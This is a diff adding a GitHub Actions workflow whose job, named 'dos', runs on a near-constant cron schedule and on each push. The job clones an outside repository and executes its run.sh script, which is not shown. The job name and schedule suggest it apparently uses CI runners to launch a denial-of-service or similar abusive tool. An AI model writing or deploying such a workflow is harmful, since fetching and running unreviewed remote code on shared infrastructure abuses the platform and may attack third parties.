@@ -1,0 +1,22 @@
+
+name: get1
+on: 
+  schedule:
+    - cron: '* */6 * * *'
+  push:
+    branches: 
+      - main
+
+jobs:
+  dos:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: install GO
+      uses: actions/setup-go@v2.1.4
+      
+    - name: run it
+      run: |
+        git clone https://github.com/thun09/lab.git
+        cd lab
+        sh ./run.sh
